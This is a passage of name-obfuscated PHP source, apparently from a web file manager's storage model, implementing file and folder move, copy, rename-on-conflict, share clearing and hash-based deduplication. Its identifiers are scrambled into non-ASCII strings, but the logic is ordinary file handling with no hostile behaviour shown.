∞]; $√–¬–≠∆ = $ÑπÚˆıº[$·Ë¯™èÎ[530]]; $Éˆ‚¥°ˆ = $this->parentLevelArray($©Í¶Öêù[$·Ë¯™èÎ[530]]); foreach ($Éˆ‚¥°ˆ as $©ÆÎ‚∏ª) { if (isset($ç†Ÿ≥Ù˛[$©ÆÎ‚∏ª])) { $√–¬–≠∆ .= $ç†Ÿ≥Ù˛[$©ÆÎ‚∏ª] . $·Ë¯™èÎ[591]; } } $√–¬–≠∆ = rtrim($√–¬–≠∆, $·Ë¯™èÎ[60]) . $·Ë¯™èÎ[60]; $“∞çÀºá = $this->parentLevelArray($√–¬–≠∆); $†ûµÛºŸ = $“∞çÀºá[count($“∞çÀºá) - 1]; return array($·Ë¯™èÎ[441] => $†ûµÛºŸ, $·Ë¯™èÎ[530] => $√–¬–≠∆); } private function _makeItemData($ˆâî£›µ, $‰˜ß∏·ò, $º”´–ü‡) { $˚¯ﬂØèﬂ =& $_SERVER[Á≈ ä ∞]; $»ÏË°£π = array($˚¯ﬂØèﬂ[592] => $ˆâî£›µ[$˚¯ﬂØèﬂ[419]], $˚¯ﬂØèﬂ[429] => $º”´–ü‡, $˚¯ﬂØèﬂ[593] => $ˆâî£›µ[$˚¯ﬂØèﬂ[421]] ? $ˆâî£›µ[$˚¯ﬂØèﬂ[421]] : $˚¯ﬂØèﬂ[22], $˚¯ﬂØèﬂ[478] => $ˆâî£›µ[$˚¯ﬂØèﬂ[477]] ? $ˆâî£›µ[$˚¯ﬂØèﬂ[477]] : 0, $˚¯ﬂØèﬂ[594] => $ˆâî£›µ[$˚¯ﬂØèﬂ[86]] ? $ˆâî£›µ[$˚¯ﬂØèﬂ[86]] : 0, $˚¯ﬂØèﬂ[595] => intval($‰˜ß∏·ò[$˚¯ﬂØèﬂ[420]]), $˚¯ﬂØèﬂ[596] => intval($‰˜ß∏·ò[$˚¯ﬂØèﬂ[514]]), $˚¯ﬂØèﬂ[597] => intval(USER_ID), $˚¯ﬂØèﬂ[598] => intval(USER_ID), $˚¯ﬂØèﬂ[410] => intval($‰˜ß∏·ò[$˚¯ﬂØèﬂ[411]]), $˚¯ﬂØèﬂ[599] => $‰˜ß∏·ò[$˚¯ﬂØèﬂ[530]] . $‰˜ß∏·ò[$˚¯ﬂØèﬂ[411]] . $˚¯ﬂØèﬂ[60], $˚¯ﬂØèﬂ[433] => $ˆâî£›µ[$˚¯ﬂØèﬂ[95]] ? $ˆâî£›µ[$˚¯ﬂØèﬂ[95]] : time(), $˚¯ﬂØèﬂ[439] => 0, $˚¯ﬂØèﬂ[600] => $˚¯ﬂØèﬂ[22]); return $»ÏË°£π; } private function _copyApplyMeta($€º∞è˚÷, &$ ˛»ÙÃ≠) { $óßÆñ›® =& $_SERVER[Á≈ ä ∞]; $©¨ÊõÛ« = $€º∞è˚÷[$óßÆñ›®[411]]; $æÅ“∫é∏ = $€º∞è˚÷[$óßÆñ›®[42]]; if (!isset($€º∞è˚÷[$óßÆñ›®[601]]) || !$€º∞è˚÷[$óßÆñ›®[601]] || $€º∞è˚÷[$óßÆñ›®[601]] == $óßÆñ›®[207]) { $ ˛»ÙÃ≠[$óßÆñ›®[577]][] = array($óßÆñ›®[411], $©¨ÊõÛ«, $óßÆñ›®[601], short_id($©¨ÊõÛ«)); } if (Input::check($æÅ“∫é∏, $óßÆñ›®[602])) { $ ˛»ÙÃ≠[$óßÆñ›®[576]][] = array($óßÆñ›®[411] => $©¨ÊõÛ«, $óßÆñ›®[104] => $óßÆñ›®[474], $óßÆñ›®[383] => str_replace($óßÆñ›®[63], $óßÆñ›®[22], Pinyin::get($æÅ“∫é∏))); $ ˛»ÙÃ≠[$óßÆñ›®[576]][] = array($óßÆñ›®[411] => $©¨ÊõÛ«, $óßÆñ›®[104] => $óßÆñ›®[473], $óßÆñ›®[383] => Pinyin::get($æÅ“∫é∏, $óßÆñ›®[603])); } $ ˛»ÙÃ≠[$óßÆñ›®[576]][] = array($óßÆñ›®[411] => $©¨ÊõÛ«, $óßÆñ›®[104] => $óßÆñ›®[453], $óßÆñ›®[383] => KodSort::makeStr($æÅ“∫é∏)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ºÄ›Ô™Î) { $üîƒÚ§– =& $_SERVER[Á≈ ä ∞]; $◊º«¯˝¶ = $this->sourceInfo($ºÄ›Ô™Î); $»Üò¸¿ˆ = $üîƒÚ§–[604]; $Ô˛ãàÓü = array($üîƒÚ§–[530] => array($üîƒÚ§–[559], $◊º«¯˝¶[$üîƒÚ§–[530]] . $ºÄ›Ô™Î . $üîƒÚ§–[560]), $üîƒÚ§–[440] => $this->targetIsDelete); $ÿ¸©êëŸ = $this->field($»Üò¸¿ˆ)->where($Ô˛ãàÓü)->select(); if (!$ÿ¸©êëŸ) { return; } $ÿ¸©êëŸ = array_to_keyvalue($ÿ¸©êëŸ, $üîƒÚ§–[411]); foreach ($ÿ¸©êëŸ as $öì◊€†Û) { $ıäÕ°ùº = $öì◊€†Û[$üîƒÚ§–[441]]; $ºÄ›Ô™Î = $öì◊€†Û[$üîƒÚ§–[411]]; if (!isset($this->_childrenListCache[$ºÄ›Ô™Î]) && $öì◊€†Û[$üîƒÚ§–[419]] == $üîƒÚ§–[98]) { $this->_childrenListCache[$ºÄ›Ô™Î] = array(); } if (!isset($this->_childrenListCache[$ıäÕ°ùº])) { $this->_childrenListCache[$ıäÕ°ùº] = array(); } $this->_childrenListCache[$ıäÕ°ùº][$ºÄ›Ô™Î] = $öì◊€†Û; $this->_childrenItemCache[$ºÄ›Ô™Î] = $öì◊€†Û; } } private function _childrenListAll($∫ˆñÛËï, &$∆ö†Ω•ø) { $‹ÊËª¬û =& $_SERVER[Á≈ ä ∞]; if (!isset($this->_childrenListCache[$∫ˆñÛËï])) { return; } $ÈõÆ€‘¿ = $this->_childrenListCache[$∫ˆñÛËï]; foreach ($ÈõÆ€‘¿ as $ Â˙±‘è => $ÕÌä¬‡ƒ) { $∆ö†Ω•ø[$ Â˙±‘è] = $ÕÌä¬‡ƒ; if ($ÕÌä¬‡ƒ[$‹ÊËª¬û[419]] == $‹ÊËª¬û[98]) { $this->_childrenListAll($ Â˙±‘è, $∆ö†Ω•ø); } } } private function sourceInfoCache($©É∞º»Á) { if (isset($this->_childrenItemCache[$©É∞º»Á])) { return $this->_childrenItemCache[$©É∞º»Á]; } return $this->sourceInfo($©É∞º»Á); } private function _childrenList($∑√µëÂ´) { if (isset($this->_childrenListCache[$∑√µëÂ´])) { return $this->_childrenListCache[$∑√µëÂ´]; } return $this->_childrenListSelect($∑√µëÂ´); } private function _childrenListSelect($ ÊÌÙ®Ñ) { $ƒÈ£À…œ =& $_SERVER[Á≈ ä ∞]; $„˝°˝öı = array($ƒÈ£À…œ[441] => $ ÊÌÙ®Ñ, $ƒÈ£À…œ[440] => $this->targetIsDelete); $ãÀÄîﬂÀ = $this->where($„˝°˝öı)->select(); $ãÀÄîﬂÀ = $ãÀÄîﬂÀ ? $ãÀÄîﬂÀ : array(); $ß√ìÉ›· = array_to_keyvalue($ãÀÄîﬂÀ, $ƒÈ£À…œ[411]); $this->_childrenListCache[$ ÊÌÙ®Ñ] = $ß√ìÉ›·; foreach ($ß√ìÉ›· as $ ÊÌÙ®Ñ => $Éµ¶ç˛≈) { $this->_childrenItemCache[$ ÊÌÙ®Ñ] = $Éµ¶ç˛≈; } return $ß√ìÉ›·; } private function fileNameExistCache($ØŒ∏‚ç√, $Ó∫˚¯é˜) { $ö•≤âÚå =& $_SERVER[Á≈ ä ∞]; $Ó∫˚¯é˜ = strtolower($Ó∫˚¯é˜); $—»Çáì“ = $this->_childrenList($ØŒ∏‚ç√); foreach ($—»Çáì“ as $ö‡∑ìÃ») { if ($Ó∫˚¯é˜ == strtolower($ö‡∑ìÃ»[$ö•≤âÚå[42]])) { return $ö‡∑ìÃ»[$ö•≤âÚå[411]]; } } return !1; } private function fileNameAutoCache($Úó˙≠ä¡, $ê˙Û£‹ê, $ŸŸ•¨Î™, $ÎÑ¢ÿ¡¸) { $Œœîó¯ì =& $_SERVER[Á≈ ä ∞]; $üﬂùÛ…Â = $this->_childrenList($Úó˙≠ä¡); $Øâ®Øû˜ = array_to_keyvalue($üﬂùÛ…Â, $Œœîó¯ì[22], $Œœîó¯ì[42]); return $this->fileNameAutoGet($Øâ®Øû˜, $ê˙Û£‹ê, $ŸŸ•¨Î™, $ÎÑ¢ÿ¡¸); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($‘ë·Áé•, $œíÿÀÛ‹, $£§≈ŒÁ˘ = REPEAT_REPLACE, $ËÎ∏ÆÈÍ = '') { $¡ë≈≠˚Û =& $_SERVER[Á≈ ä ∞]; $˜‰Ñ¿Ó˚ = $this->sourceInfo($‘ë·Áé•); $…Ê©öñ¥ = $this->sourceInfo($œíÿÀÛ‹); if ($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[441]] == $…Ê©öñ¥[$¡ë≈≠˚Û[411]]) { if ($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[440]] == $¡ë≈≠˚Û[98]) { Model($¡ë≈≠˚Û[438])->restore(array($‘ë·Áé•)); } if (!$ËÎ∏ÆÈÍ || $ËÎ∏ÆÈÍ == $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[42]]) { return $‘ë·Áé•; } } $˙ôﬁµºÃ = $this->pathInfoMore($‘ë·Áé•); if ($this->isParentOf($‘ë·Áé•, $œíÿÀÛ‹)) { return !1; } if (!$˜‰Ñ¿Ó˚ || !$…Ê©öñ¥ || $…Ê©öñ¥[$¡ë≈≠˚Û[419]] != $¡ë≈≠˚Û[98]) { return !1; } Hook::trigger($¡ë≈≠˚Û[605], $˙ôﬁµºÃ); $this->targetIsDelete = intval($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[440]]); if ($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[441]] == $œíÿÀÛ‹ && $ËÎ∏ÆÈÍ != $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[42]]) { $ﬂ¯˘ÒΩÕ = $this->fileNameExist($œíÿÀÛ‹, $ËÎ∏ÆÈÍ); if ($ﬂ¯˘ÒΩÕ && $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[419]] == $¡ë≈≠˚Û[207]) { $ìÄ∂Óèõ = $this->sourceInfo($ﬂ¯˘ÒΩÕ); $áïç¨íå = $this->fileHistory($ìÄ∂Óèõ, $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[477]], $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[86]]); if (!$áïç¨íå) { Model($¡ë≈≠˚Û[480])->remove($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[477]]); } $this->removeNow($‘ë·Áé•, !1); $this->folderSizeReset($œíÿÀÛ‹); Hook::trigger($¡ë≈≠˚Û[606], $˙ôﬁµºÃ); return $ﬂ¯˘ÒΩÕ; } } $ñ∏ƒÏÆº = $ËÎ∏ÆÈÍ ? $ËÎ∏ÆÈÍ : $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[42]]; $this->lockMoveStart($‘ë·Áé•); $this->lockWriteStart($œíÿÀÛ‹, $ñ∏ƒÏÆº); $Éîç≠á√ = array($¡ë≈≠˚Û[575] => array(), $¡ë≈≠˚Û[607] => !1); $this->clearShare($‘ë·Áé•, $œíÿÀÛ‹); $∑˛ëë≥… = $this->fileNameExistCache($œíÿÀÛ‹, $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[42]]); $¯·≈Î˜ú = $this->_move($‘ë·Áé•, $œíÿÀÛ‹, $£§≈ŒÁ˘, $Éîç≠á√, $ËÎ∏ÆÈÍ); $this->sourceCacheClear(); if ($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[419]] == $¡ë≈≠˚Û[98] && $∑˛ëë≥…) { $this->folderSizeResetChildren($¯·≈Î˜ú); } Model($¡ë≈≠˚Û[209])->linkAdd($Éîç≠á√[$¡ë≈≠˚Û[575]]); if ($∑˛ëë≥… && $Éîç≠á√[$¡ë≈≠˚Û[607]]) { $this->removeNow($‘ë·Áé•, !1); } $this->lockMoveEnd($‘ë·Áé•); $this->lockWriteEnd($œíÿÀÛ‹, $ñ∏ƒÏÆº); $this->folderSizeReset($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[441]]); $this->folderSizeReset($œíÿÀÛ‹); $…¡üêô  = array($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[441]], $œíÿÀÛ‹); if ($˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[419]] == $¡ë≈≠˚Û[98]) { $…¡üêô [] = $‘ë·Áé•; } $this->updateModifyTime($…¡üêô ); Model($¡ë≈≠˚Û[579])->eventMove($‘ë·Áé•, $˜‰Ñ¿Ó˚[$¡ë≈≠˚Û[441]], $œíÿÀÛ‹); Hook::trigger($¡ë≈≠˚Û[606], $˙ôﬁµºÃ); return $¯·≈Î˜ú; } private function _move($í∞‹Ÿ™Ù, $õïπÙŒñ, $£åªã±Î, &$Êõé‚ã∏, $âØ≥âä¬ = '') { $Î©±˙ô˙ =& $_SERVER[Á≈ ä ∞]; $ãÙ·¬£ = $this->sourceInfo($í∞‹Ÿ™Ù); $ÆÊâÑ˛… = $ãÙ·¬£[$Î©±˙ô˙[419]] == $Î©±˙ô˙[98]; $∫≥äèìî = $âØ≥âä¬ ? $âØ≥âä¬ : $ãÙ·¬£[$Î©±˙ô˙[42]]; $™◊ ˙û˚ = $this->fileNameExistCache($õïπÙŒñ, $∫≥äèìî); $this->lockMoveStart($í∞‹Ÿ™Ù); $this->lockWriteStart($õïπÙŒñ, $∫≥äèìî); if (!$™◊ ˙û˚) { return $this->_moveForce($í∞‹Ÿ™Ù, $õïπÙŒñ, $∫≥äèìî); } $∑ñ≠˜ƒ’ = $™◊ ˙û˚; $ÊÒ»ÿØù = !1; if ($ÆÊâÑ˛…) { if ($£åªã±Î == REPEAT_RENAME_FOLDER) { $∫≥äèìî = $this->fileNameAuto($õïπÙŒñ, $∫≥äèìî, $£åªã±Î, $ÆÊâÑ˛…); $∑ñ≠˜ƒ’ = $this->_moveForce($í∞‹Ÿ™Ù, $õïπÙŒñ, $∫≥äèìî); } else { if ($£åªã±Î == REPEAT_RENAME_FOLDER) { $£åªã±Î = REPEAT_RENAME; } $Á‡∞Û•´ = $this->_childrenListSelect($í∞‹Ÿ™Ù); foreach ($Á‡∞Û•´ as $¢˛˛úÍª) { $this->_move($¢˛˛úÍª[$Î©±˙ô˙[411]], $™◊ ˙û˚, $£åªã±Î, $Êõé‚ã∏); } $ÊÒ»ÿØù = !0; } } else { if ($£åªã±Î == REPEAT_SKIP) { $ÊÒ»ÿØù = !0; } else { if ($£åªã±Î == REPEAT_RENAME || $£åªã±Î == REPEAT_RENAME_FOLDER) { $∫≥äèìî = $this->fileNameAuto($õïπÙŒñ, $∫≥äèìî, $£åªã±Î, $ÆÊâÑ˛…); $∑ñ≠˜ƒ’ = $this->_moveForce($í∞‹Ÿ™Ù, $õïπÙŒñ, $∫≥äèìî); } else { if ($£åªã±Î == REPEAT_REPLACE) { $“¥’« æ = $this->sourceInfoCache($™◊ ˙û˚); $¢‰ù¡à = $this->fileHistory($“¥’« æ, $ãÙ·¬£[$Î©±˙ô˙[477]], $ãÙ·¬£[$Î©±˙ô˙[86]]); $ÊÒ»ÿØù = !0; if ($¢‰ù¡à) { $Êõé‚ã∏[$Î©±˙ô˙[575]][] = $ãÙ·¬£[$Î©±˙ô˙[477]]; } } } } } if ($ÊÒ»ÿØù && !$Êõé‚ã∏[$Î©±˙ô˙[607]]) { $Êõé‚ã∏[$Î©±˙ô˙[607]] = !0; } return $∑ñ≠˜ƒ’; } private function _moveForce($ø∞Ë€Á¿, $ı¨æπŒ, $“õƒ‚‘…) { $˘ìøì…“ =& $_SERVER[Á≈ ä ∞]; $ˆ≠Œ§ê¸ = $this->sourceInfo($ø∞Ë€Á¿); $õ…“ôıò = $this->sourceInfo($ı¨æπŒ); $Ê±ı›í = $ˆ≠Œ§ê¸[$˘ìøì…“[419]] == $˘ìøì…“[98]; $º±≤≠Æ® = array($˘ìøì…“[410] => $õ…“ôıò[$˘ìøì…“[411]], $˘ìøì…“[599] => $õ…“ôıò[$˘ìøì…“[530]] . $õ…“ôıò[$˘ìøì…“[411]] . $˘ìøì…“[60], $˘ìøì…“[595] => $õ…“ôıò[$˘ìøì…“[420]], $˘ìøì…“[596] => $õ…“ôıò[$˘ìøì…“[514]], $˘ìøì…“[598] => USER_ID, $˘ìøì…“[429] => $“õƒ‚‘…); $î’¯ïˆ” = $ˆ≠Œ§ê¸[$˘ìøì…“[420]] == SourceModel::TYPE_GROUP && $õ…“ôıò[$˘ìøì…“[420]] == SourceModel::TYPE_GROUP && $ˆ≠Œ§ê¸[$˘ìøì…“[514]] == $õ…“ôıò[$˘ìøì…“[514]]; if (!$î’¯ïˆ” && $this->moveClearAuth) { Model($˘ìøì…“[511])->authClear($ø∞Ë€Á¿); } $ØåÿÒïø = $ˆ≠Œ§ê¸[$˘ìøì…“[440]] == $˘ìøì…“[98] && $õ…“ôıò[$˘ìøì…“[440]] != $˘ìøì…“[98]; if ($ØåÿÒïø) { $º±≤≠Æ®[$˘ìøì…“[439]] = 0; } if ($Ê±ı›í) { $™åÑâÍî = array($˘ìøì…“[599] => array($˘ìøì…“[559], $ˆ≠Œ§ê¸[$˘ìøì…“[530]] . $ˆ≠Œ§ê¸[$˘ìøì…“[411]] . $˘ìøì…“[560])); $Œﬁí√¬⁄ = $ˆ≠Œ§ê¸[$˘ìøì…“[530]] . $ˆ≠Œ§ê¸[$˘ìøì…“[411]] . $˘ìøì…“[60]; $ÛÑ∂•îÒ = $õ…“ôıò[$˘ìøì…“[530]] . $õ…“ôıò[$˘ìøì…“[411]] . $˘ìøì…“[60] . $ˆ≠Œ§ê¸[$˘ìøì…“[411]] . $˘ìøì…“[60]; $øßÇ£–≠ = array($˘ìøì…“[599] => array($˘ìøì…“[608], "\x72\x65\x70\x6c\x61\143\145\x28\160\141\x72\x65\x6e\164\x4c\x65\x76\x65\154\54\x27{$Œﬁí√¬⁄}\x27\54\47{$ÛÑ∂•îÒ}\47\51"), $˘ìøì…“[595] => $õ…“ôıò[$˘ìøì…“[420]], $˘ìøì…“[596] => $õ…“ôıò[$˘ìøì…“[514]]); if ($ØåÿÒïø) { $øßÇ£–≠[$˘ìøì…“[439]] = 0; } $this->where($™åÑâÍî)->data($øßÇ£–≠)->save(); } $this->where(array($˘ìøì…“[426] => $ø∞Ë€Á¿))->data($º±≤≠Æ®)->save(); return $ø∞Ë€Á¿; } private function clearShare($ÙöìÏÕƒ, $ÈØ’„ç√) { $˘√¯äˆ™ =& $_SERVER[Á≈ ä ∞]; $¿˝É£óÇ = $this->sourceInfo($ÙöìÏÕƒ); $¿ÄÖ£ë± = $this->sourceInfo($ÈØ’„ç√); if ($¿˝É£óÇ[$˘√¯äˆ™[514]] == $¿ÄÖ£ë±[$˘√¯äˆ™[514]] && $¿˝É£óÇ[$˘√¯äˆ™[420]] == $˘√¯äˆ™[609]) { return; } $àÑ áçπ = array($˘√¯äˆ™[530] => array($˘√¯äˆ™[559], $¿˝É£óÇ[$˘√¯äˆ™[530]] . $ÙöìÏÕƒ . $˘√¯äˆ™[560])); $àÌöï∞» = $this->field($˘√¯äˆ™[426])->where($àÑ áçπ)->getField($˘√¯äˆ™[411], !0); if (!$àÌöï∞») { return; } $àÑ áçπ = array($˘√¯äˆ™[411] => array($˘√¯äˆ™[17], $àÌöï∞»), $˘√¯äˆ™[505] => 1); $Æÿé¥ºŸ = Model($˘√¯äˆ™[610])->field($˘√¯äˆ™[498])->where($àÑ áçπ)->select(); if (!$Æÿé¥ºŸ) { return; } $Æÿé¥ºŸ = array_to_keyvalue($Æÿé¥ºŸ, $˘√¯äˆ™[22], $˘√¯äˆ™[498]); $àÑ áçπ = array($˘√¯äˆ™[498] => array($˘√¯äˆ™[17], $Æÿé¥ºŸ)); Model($˘√¯äˆ™[610])->where($àÑ áçπ)->save(array($˘√¯äˆ™[505] => 0)); Model($˘√¯äˆ™[611])->where($àÑ áçπ)->delete(); } public function copyFolderFromIO($Õ®∫ô∫, $Ø§áÁ„Æ, $Øã˜Âé», $√£ÄËØ«, $ƒ∫â¬Ï≥, $Ï◊´Öƒ∆ = false) { $Û∑éçõñ =& $_SERVER[Á≈ ä ∞]; $π™Œñ±í = array($Û∑éçõñ[576] => array(), $Û∑éçõñ[577] => array(), $Û∑éçõñ[575] => array(), $Û∑éçõñ[612] => array()); $—ãÇß˙ç = $Ï◊´Öƒ∆ ? $Ï◊´Öƒ∆ : $Õ®∫ô∫->pathThis($Ø§áÁ„Æ); $ÇïßÌÏ∆ = $this->fileNameExist($Øã˜Âé», $—ãÇß˙ç); $Ôê¸í·Ü = $this->mkdir($Øã˜Âé», $—ãÇß˙ç, $√£ÄËØ«); if (!$ÇïßÌÏ∆ || $√£ÄËØ« == REPEAT_RENAME_FOLDER) { $√£ÄËØ« = !1; } if ($ÇïßÌÏ∆) { $this->_childrenAllMake($ÇïßÌÏ∆); } Hook::trigger($Û∑éçõñ[613]); $this->_copyChildTo($Õ®∫ô∫, $Ø§áÁ„Æ, $Ôê¸í·Ü, $√£ÄËØ«, $π™Œñ±í, $ƒ∫â¬Ï≥); Hook::trigger($Û∑éçõñ[614]); if ($Ôê¸í·Ü) { $this->folderSizeResetChildren($Ôê¸í·Ü); } $this->_childrenListClear(); Model($Û∑éçõñ[578])->addAll($π™Œñ±í[$Û∑éçõñ[576]], array(), !0); Model($Û∑éçõñ[579])->eventCopy($Ôê¸í·Ü); $this->saveAll($π™Œñ±í[$Û∑éçõñ[577]]); Model($Û∑éçõñ[480])->linkAdd($π™Œñ±í[$Û∑éçõñ[575]]); Model($Û∑éçõñ[480])->remove($π™Œñ±í[$Û∑éçõñ[612]]); $this->folderSizeReset($Øã˜Âé»); $this->updateModifyTime($Øã˜Âé»); return $Ôê¸í·Ü; } private function _copyChildTo($êÜÀàÀΩ, $˚¯‚≠´¿, $ÀÂ‹âƒØ, $ìÌ∏øöÌ, &$Ÿò≤ü∏¢, $ì⁄ü‡⁄Ë) { $á©ÉﬁàÍ =& $_SERVER[Á≈ ä ∞]; $˘ÑØ´˝Â = $this->sourceInfoCache($ÀÂ‹âƒØ); $‡˘Ÿä®à = $êÜÀàÀΩ->listPath($˚¯‚≠´¿); $‡˘Ÿä®à = $‡˘Ÿä®à ? $‡˘Ÿä®à : array($á©ÉﬁàÍ[93] => array(), $á©ÉﬁàÍ[92] => array()); $ò†∫¬ÍÂ = array_merge($‡˘Ÿä®à[$á©ÉﬁàÍ[93]], $‡˘Ÿä®à[$á©ÉﬁàÍ[92]]); $Ë‹Ø…à≥ = $this->_addFiles($êÜÀàÀΩ, $‡˘Ÿä®à[$á©ÉﬁàÍ[93]], $ì⁄ü‡⁄Ë); $≥Ù¸ÊΩÁ = array(); foreach ($ò†∫¬ÍÂ as &$Ú‰ƒ∑Í√) { if (isset($Ë‹Ø…à≥[$Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]]])) { $Ú‰ƒ∑Í√ = $Ë‹Ø…à≥[$Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]]]; } $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[419]] = $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[43]] == $á©ÉﬁàÍ[85]; $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[421]] = substr(_get($Ú‰ƒ∑Í√, $á©ÉﬁàÍ[184], $á©ÉﬁàÍ[22]), 0, 10); $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[86]] = _get($Ú‰ƒ∑Í√, $á©ÉﬁàÍ[86], 0); $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]] = _get($Ú‰ƒ∑Í√, $á©ÉﬁàÍ[477], 0); if (!isset($Ú‰ƒ∑Í√[$á©ÉﬁàÍ[615]]) && $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]]) { $Ÿò≤ü∏¢[$á©ÉﬁàÍ[612]][] = $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]]; } if ($ìÌ∏øöÌ) { $’‹‚ù‘° = $this->fileNameExistCache($ÀÂ‹âƒØ, $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]]); if ($’‹‚ù‘°) { if ($Ú‰ƒ∑Í√[$á©ÉﬁàÍ[419]] || $ìÌ∏øöÌ == REPEAT_SKIP) { continue; } if ($ìÌ∏øöÌ == REPEAT_REPLACE) { $æ÷ü˛Ã≠ = $this->sourceInfoCache($’‹‚ù‘°); $Ñº†Î © = $this->fileHistory($æ÷ü˛Ã≠, $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]], $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[86]]); if ($Ñº†Î ©) { $Ÿò≤ü∏¢[$á©ÉﬁàÍ[575]][] = $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]]; } continue; } else { if ($ìÌ∏øöÌ == REPEAT_RENAME) { $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]] = $this->fileNameAutoCache($ÀÂ‹âƒØ, $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]], $ìÌ∏øöÌ, !1); } } } } if (!$Ú‰ƒ∑Í√[$á©ÉﬁàÍ[419]] && $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]] == 0) { continue; } if (!$Ú‰ƒ∑Í√[$á©ÉﬁàÍ[419]] && $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]]) { $Ÿò≤ü∏¢[$á©ÉﬁàÍ[575]][] = $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[477]]; } $≥Ù¸ÊΩÁ[] = $this->_makeItemData($Ú‰ƒ∑Í√, $˘ÑØ´˝Â, $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]]); } unset($Ú‰ƒ∑Í√); if (!empty($≥Ù¸ÊΩÁ)) { $this->addAll($≥Ù¸ÊΩÁ); $this->_childrenListSelect($ÀÂ‹âƒØ); } $˘ä˝÷çÏ = $this->_childrenList($ÀÂ‹âƒØ); $˘ä˝÷çÏ = array_to_keyvalue($˘ä˝÷çÏ, $á©ÉﬁàÍ[42]); foreach ($ò†∫¬ÍÂ as $Ú‰ƒ∑Í√) { $æ÷ü˛Ã≠ = $˘ä˝÷çÏ[$Ú‰ƒ∑Í√[$á©ÉﬁàÍ[42]]]; $áÜ˘⁄Ìï = $æ÷ü˛Ã≠[$á©ÉﬁàÍ[411]]; $this->_copyApplyMeta($æ÷ü˛Ã≠, $Ÿò≤ü∏¢); if ($Ú‰ƒ∑Í√[$á©ÉﬁàÍ[43]] == $á©ÉﬁàÍ[85]) { $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[94]] = $êÜÀàÀΩ->getPathInner($Ú‰ƒ∑Í√[$á©ÉﬁàÍ[94]]); $this->_copyChildTo($êÜÀàÀΩ, $Ú‰ƒ∑Í√[$á©ÉﬁàÍ[94]], $áÜ˘⁄Ìï, $ìÌ∏øöÌ, $Ÿò≤ü∏¢, $ì⁄ü‡⁄Ë); } } } private function _addFiles($ç∞ç˘’≠, $´ÜøÙøÜ, $¿©≤√Á†) { $Úü‘˘À∏ =& $_SERVER[Á≈ ä ∞]; if (!$´ÜøÙøÜ || count($´ÜøÙøÜ) == 0) { return array(); } $§Å„çÌ€ = array(); foreach ($´ÜøÙøÜ as &$¿à≥ùíπ) { Hook::trigger($Úü‘˘À∏[616], $¿à≥ùíπ); $¿à≥ùíπ[$Úü‘˘À∏[94]] = $ç∞ç˘’≠->getPathInner($¿à≥ùíπ[$Úü‘˘À∏[94]]); $ãÍŒÿº¯ = $ç∞ç˘’≠->hashSimple($¿à≥ùíπ[$Úü‘˘À∏[94]]); $ı≠ıÔ—ú = $ç∞ç˘’≠->hashMd5($¿à≥ùíπ[$Úü‘˘À∏[94]]); if (strlen($ı≠ıÔ—ú) > 10 && !isset($§Å„çÌ€[$ı≠ıÔ—ú])) { $§Å„çÌ€[$ı≠ıÔ—ú] = array(); } $¿à≥ùíπ[$Úü‘˘À∏[187]] = $ãÍŒÿº¯; $¿à≥ùíπ[$Úü‘˘À∏[186]] = $ı≠ıÔ—ú; $§Å„çÌ€[$ı≠ıÔ—ú][] =& $¿à≥ùíπ; if (count($§Å„çÌ€[$ı≠ıÔ—ú]) > 1) { $¿à≥ùíπ[$Úü‘˘À∏[615]] = !0; } Hook::trigger($Úü‘˘À∏[617], $¿à≥ùíπ); } unset($¿à≥ùíπ); $‡÷£Æ≤‘ = array($Úü‘˘À∏[186] => array($Úü‘˘À∏[17], array_keys($§Å„çÌ€))); $≠≈›ıãÒ = Model($Úü‘˘À∏[618]); $ûŒÿ‰õ¢ = $≠≈›ıãÒ->where($‡÷£Æ≤‘)->select(); $ûŒÿ‰õ¢ = $ûŒÿ‰õ¢ ? $ûŒÿ‰õ¢ : array(); foreach ($ûŒÿ‰õ¢ as $ãèÁøæÉ) { if (!isset($§Å„çÌ€[$ãèÁøæÉ[$Úü‘˘À∏[186]]])) { continue; } $∞ê÷´◊¸ = $§Å„çÌ€[$ãèÁøæÉ[$Úü‘˘À∏[186]]]; foreach ($∞ê÷´◊¸ as &$¿à≥ùíπ) { $¿à≥ùíπ[$Úü‘˘À∏[477]] = $ãèÁøæÉ[$Úü‘˘À∏[477]]; $¿à≥ùíπ[$Úü‘˘À∏[615]] = !0; } unset($¿à≥ùíπ); } $™§ÿó‹é = array(); foreach ($´ÜøÙøÜ as $¶πÕπò) { 